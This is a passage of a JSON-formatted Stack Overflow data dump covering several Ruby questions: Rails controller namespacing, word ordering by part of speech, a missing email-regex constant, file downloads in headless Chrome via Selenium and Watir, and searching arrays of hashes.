Features::RsyslogRulesController &lt; ApplicationController;end\n</code></pre>\n\n<p>I\u2019m curious, given that there are multiple features and I\u2019d like to keep each features controllers nested in a directory specific to that feature.. i.e. (rsyslog containing all of the rsyslog controllers) as opposed to building the structure like so: </p>\n\n<pre><code>features/\nfeatures/rsyslog_inputs_controller.rb\nfeatures/rsyslog_outputs_controller.rb\nfeatures/rsyslog_rules_controller.rb\n</code></pre>\n\n<p>How does that translate to the controller code class definition? doing this: </p>\n\n<pre><code>Class Features::Rsyslog::RsyslogInputsController &lt; ApplicationController; end\n</code></pre>\n\n<p><em>(note the addition of Rsyslog above)</em></p>\n\n<p>RubyMine it\u2019s getting pissy with a \u201cexpected end of line\u201d on the second set of \u201c::\u201d in the class definition... However, the routes work.. Am I missing something here? is this just my IDE being weird? </p>\n"}, {"tags": ["ruby", "sorting", "nlp", "pos-tagger", "part-of-speech"], "comments": [{"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1511987336, "post_id": 47560450, "comment_id": 82080170, "body": "I doubt that you are going to get much help here. There is no &quot;right answer&quot; to your question and it calls for opinions, which may rule it <a href=\"https://stackoverflow.blog/2010/09/29/good-subjective-bad-subjective/\">out-of-bounds for SO</a>."}, {"owner": {"reputation": 167912, "user_id": 240443, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/495d675e3bc42ed1dee469e2ce701f1b?s=128&d=identicon&r=PG", "display_name": "Amadan", "link": "https://stackoverflow.com/users/240443/amadan"}, "edited": false, "score": 0, "creation_date": 1512005720, "post_id": 47560450, "comment_id": 82087137, "body": "Also, what do you mean &quot;grammatical&quot; for a pair of words? Is &quot;eat an&quot; a grammatical pair of words (since &quot;eat an omelette&quot; is a grammatical sentence)? And what does it have to do with <a href=\"https://stackoverflow.com/questions/tagged/sorting\">sorting</a> and <a href=\"https://stackoverflow.com/questions/tagged/ruby\">ruby</a>?"}, {"owner": {"reputation": 1, "user_id": 7366985, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d20a8c782bcb836feaeedde590669c6d?s=128&d=identicon&r=PG&f=1", "display_name": "gongo", "link": "https://stackoverflow.com/users/7366985/gongo"}, "edited": false, "score": 0, "creation_date": 1512012114, "post_id": 47560450, "comment_id": 82088684, "body": "Given the goals of the program, &quot;eat an&quot; would be considered more correct than &quot;an eat&quot;, yes. It doesn&#39;t make a ton of sense there, but for other cases it&#39;s quite clear which is the &quot;correct&quot; order:  &quot;adjective&quot; &quot;noun&quot; (big car, for example, not &quot;car big&quot;)"}], "owner": {"reputation": 1, "user_id": 7366985, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d20a8c782bcb836feaeedde590669c6d?s=128&d=identicon&r=PG&f=1", "display_name": "gongo", "link": "https://stackoverflow.com/users/7366985/gongo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 23, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1512005615, "creation_date": 1511984118, "question_id": 47560450, "link": "https://stackoverflow.com/questions/47560450/given-two-words-and-their-corresponding-pieces-of-speech-how-to-return-them-in", "title": "Given two words and their corresponding pieces-of-speech, how to return them in the order that makes most grammatical sense?", "body": "<p>I have an app that creates two randomly generated words. My goal is to return them in the order that makes the most sense grammatically.</p>\n\n<p>Getting their corresponding pieces-of-speech to each word should not be difficult, but my main question is to how to implement the logic to handle the rules. It seems like it would be an absurd number of relational rules given any two pieces of speech. IE, given a noun, a list of rules for which POS goes before or after it, then repeat by making another exhaustive list for each other POS and its relationships to other pieces-of-speech. How even do you structure something like that in an elegant way, if there is no better way to accomplish this?</p>\n\n<p>If a given word can be multiple pieces-of-speech (\"duck\", \"novel\", etc), is there an ideal way to handle that?</p>\n\n<p>I'm aware english is complicated and there will always be exceptions, but a \"best guess\" would be satisfactory. </p>\n"}, {"tags": ["ruby", "ruby-on-rails-5", "railstutorial.org"], "comments": [{"owner": {"reputation": 20590, "user_id": 504963, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/xlYLo.jpg?s=128&g=1", "display_name": "Antarr Byrd", "link": "https://stackoverflow.com/users/504963/antarr-byrd"}, "edited": false, "score": 0, "creation_date": 1511983843, "post_id": 47560238, "comment_id": 82078442, "body": "Where are you defining? VALID_EMAIL_REGEX"}, {"owner": {"reputation": 11, "user_id": 9027321, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Gl5O8.jpg?s=128&g=1", "display_name": "Jim", "link": "https://stackoverflow.com/users/9027321/jim"}, "reply_to_user": {"reputation": 20590, "user_id": 504963, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/xlYLo.jpg?s=128&g=1", "display_name": "Antarr Byrd", "link": "https://stackoverflow.com/users/504963/antarr-byrd"}, "edited": false, "score": 0, "creation_date": 1511985635, "post_id": 47560238, "comment_id": 82079343, "body": "Thank you for your response.  A solution was found by following your guidance below. I modified app/model/user.rb to include:   VALID_EMAIL_REGEX = /\\A[\\w+\\-.]+@[a-z\\d\\-.]+\\.[a-z]+\\z/i   validates :email, presence: true, length: { maximum: 255 },                     format: { with: VALID_EMAIL_REGEX },        ."}], "answers": [{"comments": [{"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 1, "creation_date": 1511984898, "post_id": 47560409, "comment_id": 82078985, "body": "These days you really need to be way more generous: <code>VALID_EMAIL_REGEX = &#47;\\A[^@]+@[^@]+&#47;z</code> is the closest we can get. <a href=\"https://en.wikipedia.org/wiki/Email_address\" rel=\"nofollow noreferrer\">Email addresses</a> can and will contain all sorts of crazy stuff including non-ASCII characters and spaces."}], "tags": [], "owner": {"reputation": 20590, "user_id": 504963, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/xlYLo.jpg?s=128&g=1", "display_name": "Antarr Byrd", "link": "https://stackoverflow.com/users/504963/antarr-byrd"}, "is_accepted": false, "score": 0, "last_activity_date": 1511986018, "last_edit_date": 1511986018, "creation_date": 1511983963, "answer_id": 47560409, "question_id": 47560238, "link": "https://stackoverflow.com/questions/47560238/rails-uninitialized-constant-uservalid-email-regex/47560409#47560409", "title": "Rails: Uninitialized constant User::VALID_EMAIL_REGEX", "body": "<p>Looks like you are missing the regex in your User model</p>\n\n<pre><code>class User &lt; ApplicationsRecord\n  VALID_EMAIL_REGEX = /\\A[\\w+\\-.]+@[a-z\\d\\-.]+\\.[a-z]+\\z/i\n ...\n\nend\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 7944, "user_id": 10907864, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tGpcY.jpg?s=128&g=1", "display_name": "Promise Preston", "link": "https://stackoverflow.com/users/10907864/promise-preston"}, "is_accepted": false, "score": 0, "last_activity_date": 1586389948, "creation_date": 1586389948, "answer_id": 61111832, "question_id": 47560238, "link": "https://stackoverflow.com/questions/47560238/rails-uninitialized-constant-uservalid-email-regex/61111832#61111832", "title": "Rails: Uninitialized constant User::VALID_EMAIL_REGEX", "body": "<p>Just to add to <a href=\"https://stackoverflow.com/a/47560409/10907864\">Antarr Byrd's answer</a>.</p>\n\n<p>I had a similar experience when working on a Rails Application.</p>\n\n<p>The issue was that I was defining the REGEX constant below the point of validation call.</p>\n\n<p><strong>That is, instead of this</strong>:</p>\n\n<pre><code>class User &lt; ApplicationRecord \n  validates :email, presence: true, length: { maximum: 255 },\n                            format: { with: VALID_EMAIL_REGEX }\n\n  VALID_EMAIL_REGEX = /\\A[\\w+\\-.]+@[a-z\\d\\-.]+\\.[a-z]+\\z/i\nend\n</code></pre>\n\n<p><strong>Do this rather</strong>:</p>\n\n<pre><code>class User &lt; ApplicationRecord\n  VALID_EMAIL_REGEX = /\\A[\\w+\\-.]+@[a-z\\d\\-.]+\\.[a-z]+\\z/i\n\n  validates :email, presence: true, length: { maximum: 255 },\n                            format: { with: VALID_EMAIL_REGEX }\n\nend\n</code></pre>\n\n<p>That's all.</p>\n\n<p><strong>I hope this helps</strong></p>\n"}], "owner": {"reputation": 11, "user_id": 9027321, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Gl5O8.jpg?s=128&g=1", "display_name": "Jim", "link": "https://stackoverflow.com/users/9027321/jim"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 890, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1586390050, "creation_date": 1511983309, "last_edit_date": 1586390050, "question_id": 47560238, "link": "https://stackoverflow.com/questions/47560238/rails-uninitialized-constant-uservalid-email-regex", "title": "Rails: Uninitialized constant User::VALID_EMAIL_REGEX", "body": "<p>Background - I am working with rails version 5.1.2. I am using Cloud 9 IDE. My problem relates to Ch 11 Rails Tutorial by Michael Hartl.\nProblem details - typing $  rails test:mailers:</p>\n\n<hr>\n\n<p>Error:\nUserMailerTest#test_account_activation:\nNameError: uninitialized constant User::VALID_EMAIL_REGEX\n    app/models/user.rb:6:in <code>&lt;class:User&gt;'\n    app/models/user.rb:1:in</code>'</p>\n\n<p>bin/rails test test/mailers/user_mailer_test.rb:5</p>\n\n<hr>\n\n<p>app/models/user.rb:1     -    app/models/user.rb:6:</p>\n\n<pre><code>class User &lt; ApplicationRecord\n  attr_accessor :remember_token, :activation_token\n  before_save   :downcase_email\n  before_create :create_activation_digest\n  validates :email, presence: true, length: { maximum: 255 },\n                            format: { with: VALID_EMAIL_REGEX },\n                            uniqueness: { case_sensitive: false }\n  has_secure_password\n  validates :password, presence: true, length: { minimum: 6 }, allow_nil: true\n</code></pre>\n"}, {"tags": ["ruby", "google-chrome", "selenium-chromedriver", "watir", "google-chrome-headless"], "answers": [{"comments": [{"owner": {"reputation": 180, "user_id": 8014464, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FMMjH.jpg?s=128&g=1", "display_name": "theRubyGuy", "link": "https://stackoverflow.com/users/8014464/therubyguy"}, "edited": false, "score": 0, "creation_date": 1512037847, "post_id": 47568046, "comment_id": 82099576, "body": "I see. Is there a workaround? if not, what are the latest versions to use in order to make download happen? Thank you"}, {"owner": {"reputation": 3480, "user_id": 4072371, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/112e615d8c60908294e30848d9556186?s=128&d=identicon&r=PG", "display_name": "titusfortner", "link": "https://stackoverflow.com/users/4072371/titusfortner"}, "reply_to_user": {"reputation": 180, "user_id": 8014464, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FMMjH.jpg?s=128&g=1", "display_name": "theRubyGuy", "link": "https://stackoverflow.com/users/8014464/therubyguy"}, "edited": false, "score": 0, "creation_date": 1512058931, "post_id": 47568046, "comment_id": 82113032, "body": "It isn&#39;t the version, it&#39;s the headless. If you use it without headless it will work. If you need headless, use headless gem with xvfb."}, {"owner": {"reputation": 180, "user_id": 8014464, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FMMjH.jpg?s=128&g=1", "display_name": "theRubyGuy", "link": "https://stackoverflow.com/users/8014464/therubyguy"}, "edited": false, "score": 0, "creation_date": 1512150431, "post_id": 47568046, "comment_id": 82155737, "body": "I am using xvfb but it still won&#39;t download while running headless."}, {"owner": {"reputation": 3480, "user_id": 4072371, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/112e615d8c60908294e30848d9556186?s=128&d=identicon&r=PG", "display_name": "titusfortner", "link": "https://stackoverflow.com/users/4072371/titusfortner"}, "reply_to_user": {"reputation": 180, "user_id": 8014464, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FMMjH.jpg?s=128&g=1", "display_name": "theRubyGuy", "link": "https://stackoverflow.com/users/8014464/therubyguy"}, "edited": false, "score": 0, "creation_date": 1512150575, "post_id": 47568046, "comment_id": 82155822, "body": "What capabilities are you sending?"}, {"owner": {"reputation": 180, "user_id": 8014464, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FMMjH.jpg?s=128&g=1", "display_name": "theRubyGuy", "link": "https://stackoverflow.com/users/8014464/therubyguy"}, "edited": false, "score": 0, "creation_date": 1512150839, "post_id": 47568046, "comment_id": 82155965, "body": "At the moment Im not, just the options.add_argument(&#39;--headless&#39;). What would you recommend?"}, {"owner": {"reputation": 3480, "user_id": 4072371, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/112e615d8c60908294e30848d9556186?s=128&d=identicon&r=PG", "display_name": "titusfortner", "link": "https://stackoverflow.com/users/4072371/titusfortner"}, "reply_to_user": {"reputation": 180, "user_id": 8014464, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FMMjH.jpg?s=128&g=1", "display_name": "theRubyGuy", "link": "https://stackoverflow.com/users/8014464/therubyguy"}, "edited": false, "score": 0, "creation_date": 1512150935, "post_id": 47568046, "comment_id": 82156028, "body": "Either use headless gem with xvfb, or pass headless command, not both"}, {"owner": {"reputation": 180, "user_id": 8014464, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FMMjH.jpg?s=128&g=1", "display_name": "theRubyGuy", "link": "https://stackoverflow.com/users/8014464/therubyguy"}, "edited": false, "score": 0, "creation_date": 1512247136, "post_id": 47568046, "comment_id": 82182859, "body": "i tried removing the xvfb and keeping the argument and it didn&#39;t solve it. what would you configure on the if ENV[&#39;HEADLESS&#39;] condition if I do want to use the xvfb as i did before? At the moment it&#39;s configure like that:  require &#39;headless&#39;   headless = Headless.new   headless.start   at_exit do     headless.destroy   end"}], "tags": [], "owner": {"reputation": 3480, "user_id": 4072371, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/112e615d8c60908294e30848d9556186?s=128&d=identicon&r=PG", "display_name": "titusfortner", "link": "https://stackoverflow.com/users/4072371/titusfortner"}, "is_accepted": false, "score": 0, "last_activity_date": 1512026959, "creation_date": 1512026959, "answer_id": 47568046, "question_id": 47559973, "link": "https://stackoverflow.com/questions/47559973/download-a-file-to-a-path-when-running-headless-mode-in-chrome/47568046#47568046", "title": "Download a file to a path when running headless mode in Chrome", "body": "<p>At this point it isn't supported. Headless was implemented without any of the chromium code that handles preferences. <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=775911\" rel=\"nofollow noreferrer\">https://bugs.chromium.org/p/chromium/issues/detail?id=775911</a></p>\n"}, {"comments": [{"owner": {"reputation": 148, "user_id": 812250, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f8b261271ae29c1748b555d18b73c226?s=128&d=identicon&r=PG", "display_name": "Nathan Appere", "link": "https://stackoverflow.com/users/812250/nathan-appere"}, "edited": false, "score": 0, "creation_date": 1523031710, "post_id": 47649592, "comment_id": 86407128, "body": "Quick question: on what system did this work for you? (It works for me on Mac but not Ubuntu so far.)"}, {"owner": {"reputation": 180, "user_id": 8014464, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FMMjH.jpg?s=128&g=1", "display_name": "theRubyGuy", "link": "https://stackoverflow.com/users/8014464/therubyguy"}, "reply_to_user": {"reputation": 148, "user_id": 812250, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f8b261271ae29c1748b555d18b73c226?s=128&d=identicon&r=PG", "display_name": "Nathan Appere", "link": "https://stackoverflow.com/users/812250/nathan-appere"}, "edited": false, "score": 0, "creation_date": 1523031837, "post_id": 47649592, "comment_id": 86407206, "body": "What do you mean exactly ? The versions are listed above in the question :)"}, {"owner": {"reputation": 148, "user_id": 812250, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f8b261271ae29c1748b555d18b73c226?s=128&d=identicon&r=PG", "display_name": "Nathan Appere", "link": "https://stackoverflow.com/users/812250/nathan-appere"}, "edited": false, "score": 0, "creation_date": 1523032166, "post_id": 47649592, "comment_id": 86407376, "body": "There is no OS specified in the question, so I am just curious to know if you managed to have that solution work on Linux. (In the chromium thread people do a really poor job of specifying what OS they are using, and get different behaviors on different systems)."}, {"owner": {"reputation": 180, "user_id": 8014464, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FMMjH.jpg?s=128&g=1", "display_name": "theRubyGuy", "link": "https://stackoverflow.com/users/8014464/therubyguy"}, "reply_to_user": {"reputation": 148, "user_id": 812250, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f8b261271ae29c1748b555d18b73c226?s=128&d=identicon&r=PG", "display_name": "Nathan Appere", "link": "https://stackoverflow.com/users/812250/nathan-appere"}, "edited": false, "score": 0, "creation_date": 1523032243, "post_id": 47649592, "comment_id": 86407414, "body": "Oh yes I have, the OS I\u2019m using is Centos 7."}, {"owner": {"reputation": 148, "user_id": 812250, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f8b261271ae29c1748b555d18b73c226?s=128&d=identicon&r=PG", "display_name": "Nathan Appere", "link": "https://stackoverflow.com/users/812250/nathan-appere"}, "edited": false, "score": 1, "creation_date": 1523032310, "post_id": 47649592, "comment_id": 86407449, "body": "Thanks for the precision!"}, {"owner": {"reputation": 180, "user_id": 8014464, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FMMjH.jpg?s=128&g=1", "display_name": "theRubyGuy", "link": "https://stackoverflow.com/users/8014464/therubyguy"}, "edited": false, "score": 0, "creation_date": 1532280723, "post_id": 47649592, "comment_id": 89903754, "body": "It does actually."}, {"owner": {"reputation": 587, "user_id": 4297122, "user_type": "registered", "accept_rate": 53, "profile_image": "https://graph.facebook.com/100000722742064/picture?type=large", "display_name": "Jais Anasrulloh Ja&#39;fari", "link": "https://stackoverflow.com/users/4297122/jais-anasrulloh-jafari"}, "edited": false, "score": 0, "creation_date": 1532329531, "post_id": 47649592, "comment_id": 89914625, "body": "your solution, the browser is created from selenium not from watir, if it is from watir it should be like this right?: <code>driver = Selenium::WebDriver.for :chrome     browser = Watir::Browser.new driver</code>"}, {"owner": {"reputation": 180, "user_id": 8014464, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FMMjH.jpg?s=128&g=1", "display_name": "theRubyGuy", "link": "https://stackoverflow.com/users/8014464/therubyguy"}, "edited": false, "score": 0, "creation_date": 1532359788, "post_id": 47649592, "comment_id": 89933593, "body": "My current environment is running Watir with the configurations you just mentioned and the configurations I used in this thread."}, {"owner": {"reputation": 3338, "user_id": 38753, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/cdb4e3e965558168bc1205ae2012e444?s=128&d=identicon&r=PG", "display_name": "EightyEight", "link": "https://stackoverflow.com/users/38753/eightyeight"}, "reply_to_user": {"reputation": 587, "user_id": 4297122, "user_type": "registered", "accept_rate": 53, "profile_image": "https://graph.facebook.com/100000722742064/picture?type=large", "display_name": "Jais Anasrulloh Ja&#39;fari", "link": "https://stackoverflow.com/users/4297122/jais-anasrulloh-jafari"}, "edited": false, "score": 0, "creation_date": 1539357414, "post_id": 47649592, "comment_id": 92486346, "body": "@JaisAnasrullohJa&#39;fari <code>Watir::Browser.new $browser</code> will you get a watir browser. Thanks for the snipped @theRubyGuy"}], "tags": [], "owner": {"reputation": 180, "user_id": 8014464, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FMMjH.jpg?s=128&g=1", "display_name": "theRubyGuy", "link": "https://stackoverflow.com/users/8014464/therubyguy"}, "is_accepted": false, "score": 12, "last_activity_date": 1512464270, "creation_date": 1512464270, "answer_id": 47649592, "question_id": 47559973, "link": "https://stackoverflow.com/questions/47559973/download-a-file-to-a-path-when-running-headless-mode-in-chrome/47649592#47649592", "title": "Download a file to a path when running headless mode in Chrome", "body": "<p>So here's what I found and it definitely worked!</p>\n\n<p>in the env.rb file when I configure the parameters for the headless mode, I defined it as such:</p>\n\n<pre><code>options = Selenium::WebDriver::Chrome::Options.new\noptions.add_argument('--headless') \noptions.add_argument('--no-sandbox')\noptions.add_argument('--disable-gpu')\noptions.add_argument('--disable-popup-blocking')\noptions.add_argument('--window-size=1366,768')\noptions.add_preference(:download, directory_upgrade: true,\n                                prompt_for_download: false,\n                                default_directory: DOWNLOAD_DIR)\n\noptions.add_preference(:browser, set_download_behavior: { behavior: 'allow' })\n\n$browser = Selenium::WebDriver.for :chrome, options: options\n\nbridge = $browser.send(:bridge)\npath = '/session/:session_id/chromium/send_command'\npath[':session_id'] = bridge.session_id\nbridge.http.call(:post, path, cmd: 'Page.setDownloadBehavior',\n                            params: {\n                              behavior: 'allow',\n                              downloadPath: DOWNLOAD_DIR\n                            })\n</code></pre>\n\n<p>Thank you comment 89 in the Chromium's bugs webpage:\n<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=696481\" rel=\"noreferrer\">https://bugs.chromium.org/p/chromium/issues/detail?id=696481</a></p>\n"}], "owner": {"reputation": 180, "user_id": 8014464, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FMMjH.jpg?s=128&g=1", "display_name": "theRubyGuy", "link": "https://stackoverflow.com/users/8014464/therubyguy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1845, "favorite_count": 0, "answer_count": 2, "score": 3, "last_activity_date": 1512464270, "creation_date": 1511982249, "last_edit_date": 1511988713, "question_id": 47559973, "link": "https://stackoverflow.com/questions/47559973/download-a-file-to-a-path-when-running-headless-mode-in-chrome", "title": "Download a file to a path when running headless mode in Chrome", "body": "<p>I'm using the following versions:</p>\n\n<ul>\n<li>Ruby 2.4.1 </li>\n<li>chromedriver 2.33</li>\n<li>selenium-webdriver 3.7.0</li>\n<li>watir 6.7.3</li>\n<li>page-object 2.2.2</li>\n<li>Chrome browser 62.0.32</li>\n</ul>\n\n<p>The env.rb file contains the path for the download directory.\nWhen running the test <strong>NOT</strong> in headless mode the file downloads perfectly, but when I am running it headless nothing happens and the file does not download.\nI was using chromderiver 2.27 and Chrome Browser 58.* and it worked in both modes, does anybody know how can I overcome that?</p>\n"}, {"tags": ["arrays", "ruby"], "comments": [{"owner": {"reputation": 35276, "user_id": 182590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/134ea397777886d6f0aa992672a50eaa?s=128&d=identicon&r=PG", "display_name": "Mark Thomas", "link": "https://stackoverflow.com/users/182590/mark-thomas"}, "edited": false, "score": 0, "creation_date": 1511980595, "post_id": 47558668, "comment_id": 82076746, "body": "Why do you have an array of hashes? Do you have the flexibility of making it an array of <code>Machine</code> objects, for example? If you will be slicing and dicing in various ways it may make sense to implement a class, the search code could be simplified quite a bit."}], "answers": [{"comments": [{"owner": {"reputation": 6836, "user_id": 458044, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3c8c35f1a799c3905fc0cab4e030803d?s=128&d=identicon&r=PG", "display_name": "Naren Sisodiya", "link": "https://stackoverflow.com/users/458044/naren-sisodiya"}, "edited": false, "score": 3, "creation_date": 1511979507, "post_id": 47558720, "comment_id": 82076205, "body": "or you can use <code>Array(machine[&#39;role&#39;]).include?(&#39;server&#39;)</code>"}, {"owner": {"reputation": 35276, "user_id": 182590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/134ea397777886d6f0aa992672a50eaa?s=128&d=identicon&r=PG", "display_name": "Mark Thomas", "link": "https://stackoverflow.com/users/182590/mark-thomas"}, "reply_to_user": {"reputation": 6836, "user_id": 458044, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3c8c35f1a799c3905fc0cab4e030803d?s=128&d=identicon&r=PG", "display_name": "Naren Sisodiya", "link": "https://stackoverflow.com/users/458044/naren-sisodiya"}, "edited": false, "score": 0, "creation_date": 1511980713, "post_id": 47558720, "comment_id": 82076801, "body": "@narensisodiya how about <code>machine[&#39;role&#39;].to_a.include?(&#39;server&#39;)</code>?"}, {"owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "reply_to_user": {"reputation": 35276, "user_id": 182590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/134ea397777886d6f0aa992672a50eaa?s=128&d=identicon&r=PG", "display_name": "Mark Thomas", "link": "https://stackoverflow.com/users/182590/mark-thomas"}, "edited": false, "score": 0, "creation_date": 1511981465, "post_id": 47558720, "comment_id": 82077137, "body": "@MarkThomas Strings don&#39;t have <code>.to_a</code>, do they?"}, {"owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "reply_to_user": {"reputation": 1708, "user_id": 3569921, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/077N5.jpg?s=128&g=1", "display_name": "marcusshep", "link": "https://stackoverflow.com/users/3569921/marcusshep"}, "edited": false, "score": 0, "creation_date": 1511983733, "post_id": 47558720, "comment_id": 82078365, "body": "@marcusshep They don&#39;t for me, and it&#39;s not in the documentation. What makes you think they do?"}, {"owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "reply_to_user": {"reputation": 1708, "user_id": 3569921, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/077N5.jpg?s=128&g=1", "display_name": "marcusshep", "link": "https://stackoverflow.com/users/3569921/marcusshep"}, "edited": false, "score": 0, "creation_date": 1511984367, "post_id": 47558720, "comment_id": 82078731, "body": "@marcusshep I already told you they don&#39;t for me, meaning I already tested that. That test results in <code>NoMethodError: undefined method `to_a&#39; for &quot;foo&quot;:String.</code>"}, {"owner": {"reputation": 6836, "user_id": 458044, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3c8c35f1a799c3905fc0cab4e030803d?s=128&d=identicon&r=PG", "display_name": "Naren Sisodiya", "link": "https://stackoverflow.com/users/458044/naren-sisodiya"}, "edited": false, "score": 0, "creation_date": 1511985458, "post_id": 47558720, "comment_id": 82079256, "body": "to_a method is not there for string. here is the doc <a href=\"https://ruby-doc.org/core-2.2.0/String.html\" rel=\"nofollow noreferrer\">2.2</a> and  <a href=\"https://ruby-doc.org/core-2.4.0/String.html\" rel=\"nofollow noreferrer\">2.4</a>"}, {"owner": {"reputation": 1670, "user_id": 6388521, "user_type": "registered", "accept_rate": 69, "profile_image": "https://lh4.googleusercontent.com/-VdFWPJVSpRc/AAAAAAAAAAI/AAAAAAAAAFo/vCc8QOz6v9Y/photo.jpg?sz=128", "display_name": "Ruslan", "link": "https://stackoverflow.com/users/6388521/ruslan"}, "edited": false, "score": 1, "creation_date": 1511987277, "post_id": 47558720, "comment_id": 82080145, "body": "<code>Class String; def to_a; [self]; end; end</code> - There. to_a for string"}, {"owner": {"reputation": 35276, "user_id": 182590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/134ea397777886d6f0aa992672a50eaa?s=128&d=identicon&r=PG", "display_name": "Mark Thomas", "link": "https://stackoverflow.com/users/182590/mark-thomas"}, "edited": false, "score": 0, "creation_date": 1512072411, "post_id": 47558720, "comment_id": 82120931, "body": "Sorry folks, <code>String</code> used to have a <code>to_a</code> method, it was removed at some point (maybe 1.9.something) and I forgot. You <i>can</i> use <code>&quot;foo&quot;.lines.to_a</code> but then that defeats the simplicity I was going for. So never mind."}], "tags": [], "owner": {"reputation": 1670, "user_id": 6388521, "user_type": "registered", "accept_rate": 69, "profile_image": "https://lh4.googleusercontent.com/-VdFWPJVSpRc/AAAAAAAAAAI/AAAAAAAAAFo/vCc8QOz6v9Y/photo.jpg?sz=128", "display_name": "Ruslan", "link": "https://stackoverflow.com/users/6388521/ruslan"}, "is_accepted": false, "score": 1, "last_activity_date": 1511977502, "creation_date": 1511977502, "answer_id": 47558720, "question_id": 47558668, "link": "https://stackoverflow.com/questions/47558668/ruby-search-array-of-hashes-and-arrays/47558720#47558720", "title": "Ruby Search Array of Hashes and Arrays", "body": "<p>That is because <code>'role'</code> can be a string or an array.</p>\n\n<p>Using <code>#include?</code> will match part of a string if it's a string. Or fully match a string inside an array. </p>\n\n<p>Try:</p>\n\n<pre><code>results = machines.select { |machine| machine['role'].include?('server') }\n</code></pre>\n\n<p>Or more robust</p>\n\n<pre><code>results = machines.select do |machine| \n  r = machine['role']\n  if r.is_a? String\n    r == 'server'\n  else\n    r.include?('server') \n  end\nend\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 3522, "user_id": 544864, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/2146b632c41a02a62279aed5b4ab57d7?s=128&d=identicon&r=PG", "display_name": "Ken J", "link": "https://stackoverflow.com/users/544864/ken-j"}, "edited": false, "score": 0, "creation_date": 1511982801, "post_id": 47559669, "comment_id": 82077837, "body": "Thanks! Grep is my preferred course so I have the option if I ever need to use regex."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 1, "creation_date": 